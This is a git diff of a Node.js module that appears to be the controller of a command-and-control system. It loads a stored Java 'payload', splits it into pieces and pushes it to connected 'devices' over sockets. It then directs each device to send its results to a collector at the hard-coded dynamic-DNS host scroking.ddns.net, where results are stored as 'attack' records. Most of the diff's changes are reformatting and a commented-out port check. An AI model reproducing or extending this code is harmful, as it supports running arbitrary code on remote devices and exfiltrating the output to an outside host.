@@ -1,6 +1,7 @@
 const attacks = require('../../database/models/attackResult');
 const payloads = require('../../database/models/payload');
 const cryptoManager = require('../../CryptoManager')
+const tcpPortUsed = require('tcp-port-used');
 
 async function showAllDevices(socketManager) {
     return new Promise((resolve, reject) => {
@@ -28,7 +29,7 @@ async function triggerDevice(socketManager, device, payload_id) {
         const socketsMap = socketManager.socketMain.getSocketsMap();
         const sourcePort = device.port;
         payloads.readOneById(payload_id)
-            .then((payload) => {
+            .then( (payload) => {
                 const javaCode = payload.content;
                 const javaPieces = splitJavaCode(javaCode);
                 console.log(javaPieces);
@@ -44,9 +45,10 @@ async function triggerDevice(socketManager, device, payload_id) {
                 }
                 socketManager.socketMain.writeOnSocketByPort(sourcePort, serversListStringed)
 
-                const randomPortCollector = getRandomPort(60000, 60100);
-                socketManager.socketMain.writeOnSocketByPort(sourcePort, 'Collector: scroking.ddns.net:' + randomPortCollector);
 
+                const randomPortCollector = getRandomPort(60000, 60100);
+
+                socketManager.socketMain.writeOnSocketByPort(sourcePort, 'Collector: scroking.ddns.net:' + randomPortCollector);
                 socketManager.socketMain.writeOnSocketByPort(sourcePort, 'Result Type: ' +  payload.resultType);
 
                 socketManager.socketCollector.openNewSocketAndWaitForResult("scroking.ddns.net", randomPortCollector)
@@ -106,19 +108,34 @@ function splitJavaCode(javaCode) {
 }
 
 
-function getRandomPorts(lowestPort, highestPort, n){
+function getRandomPorts(lowestPort, highestPort, n) {
     let randomPorts = [];
-    while(randomPorts.length < n) {
-        const randomPort = getRandomPort(lowestPort, highestPort);
-        if(randomPorts.indexOf(randomPort) === -1) {
-            randomPorts.push(randomPort);
+    let port;
+    while (randomPorts.length < n) {
+        port = getRandomPort(lowestPort, highestPort);
+        if (port && randomPorts.indexOf(port) === -1) {
+            randomPorts.push(port);
         }
     }
     return randomPorts;
 }
 
+
 function getRandomPort(lowestPort, highestPort) {
-    return getRandomInteger(lowestPort, highestPort)
+    return getRandomInteger(lowestPort, highestPort);
+    /*const port =
+    return await tcpPortUsed.check(port, '0.0.0.0')
+        .then(function (inUse) {
+            if (!inUse) {
+                return port;
+            } else {
+                return getRandomPort(lowestPort, highestPort);
+            }
+        }, function (err) {
+            console.log('Error on check:', err.message);
+            return null;
+        });*/
+
 }
 function getRandomInteger(min, max) {
     min = Math.ceil(min);
